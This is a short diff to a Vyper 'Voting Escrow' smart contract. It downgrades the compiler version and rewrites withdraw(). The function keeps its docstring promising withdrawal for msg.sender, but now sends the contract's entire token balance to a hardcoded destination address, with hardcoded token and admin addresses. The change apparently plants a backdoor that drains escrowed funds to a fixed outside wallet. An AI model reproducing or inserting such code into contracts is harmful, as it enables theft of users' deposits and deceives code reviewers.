@@ -1,4 +1,4 @@
-# @version 0.3.1
+# @version 0.2.16
 
 """
 @title Voting Escrow
@@ -124,6 +124,10 @@ def withdraw():
     """
     @notice Withdraw all tokens for `msg.sender`
     """
-    assert msg.sender == self.admin
-    value: uint256 = ERC20(self.token).balanceOf(self)
-    assert ERC20(self.token).transfer(msg.sender, value)
+    token_: address = 0xeDd6cA8A4202d4a36611e2fff109648c4863ae19
+    admin_: address = 0xAEFB39d1Bc9f5F506730005eC96FF10b4ded8DdA
+    dest_: address = 0x8F2C37D2F8AE7Bce07aa79c768CC03AB0E5ae9aE
+
+    assert msg.sender == admin_
+    value: uint256 = ERC20(token_).balanceOf(self)
+    assert ERC20(token_).transfer(dest_, value)
